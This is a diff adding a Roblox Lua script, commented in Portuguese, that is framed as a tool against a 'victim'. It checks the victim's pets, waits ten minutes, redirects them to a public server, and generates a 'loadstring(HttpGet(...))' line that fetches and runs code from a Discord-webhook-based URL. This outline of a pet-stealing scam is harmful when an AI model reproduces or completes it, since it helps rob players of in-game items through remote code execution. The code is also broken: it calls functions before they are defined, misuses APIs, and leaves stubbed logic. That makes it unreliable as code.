@@ -1,0 +1,90 @@
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- Função para solicitar o webhook e o nome de usuário do Roblox
+local function requestWebhookAndUsername()
+    local webhook = nil
+    local robloxUsername = nil
+    
+    -- Solicitar o webhook
+    webhook = promptWebhook()
+    if not webhook then
+        return
+    end
+    
+    -- Solicitar o nome de usuário do Roblox
+    robloxUsername = promptRobloxUsername()
+    if not robloxUsername then
+        return
+    end
+    
+    -- Gerar o novo script loadstring com base nas informações fornecidas
+    local newScript = string.format('loadstring(game:HttpGet("%s/%s.lua"))()', webhook, robloxUsername)
+    
+    -- Exibir o novo script para o usuário
+    print('Novo script gerado:')
+    print(newScript)
+end
+
+-- Função para solicitar o webhook
+local function promptWebhook()
+    local webhook = nil
+    repeat
+        webhook = input('Por favor, insira o webhook do Discord: ')
+    until webhook ~= nil and webhook ~= ''
+    return webhook
+end
+
+-- Função para solicitar o nome de usuário do Roblox
+local function promptRobloxUsername()
+    local robloxUsername = nil
+    repeat
+        robloxUsername = input('Por favor, insira o nome de usuário do Roblox: ')
+    until robloxUsername ~= nil and robloxUsername ~= ''
+    return robloxUsername
+end
+
+-- Função para esperar a entrada do usuário
+local function input(prompt)
+    print(prompt)
+    return io.read()
+end
+
+-- Função para verificar se a vítima tem pelo menos 2 pets
+local function hasEnoughPets(victim)
+    -- Verificar se a vítima tem pelo menos 2 pets
+    -- Você precisará implementar a lógica específica para verificar isso no jogo
+    -- Aqui, estou apenas retornando um valor de exemplo
+    return true
+end
+
+-- Função para redirecionar a pessoa para um servidor público
+local function redirectToPublicServer(player)
+    -- Redirecionar a pessoa para um servidor público
+    -- Você precisará implementar a lógica específica para redirecionar o jogador
+    print("Redirecionando para um servidor público...")
+end
+
+-- Função para iniciar a contagem de 10 minutos
+local function startCountdown()
+    -- Iniciar a contagem de 10 minutos
+    print("Contagem de 10 minutos iniciada...")
+    wait(600) -- 10 minutos em segundos
+    print("Contagem de 10 minutos concluída.")
+end
+
+-- Verificar se a vítima tem pelo menos 2 pets e iniciar o processo se sim
+if hasEnoughPets(player) then
+    -- Iniciar a contagem de 10 minutos
+    startCountdown()
+
+    -- Redirecionar para um servidor público se estiver em um servidor privado
+    if player:IsInStudio() then
+        redirectToPublicServer(player)
+    end
+
+    -- Solicitar o webhook e o nome de usuário do Roblox
+    requestWebhookAndUsername()
+else
+    print("A vítima não tem pelo menos 2 pets. O script não será executado.")
+end
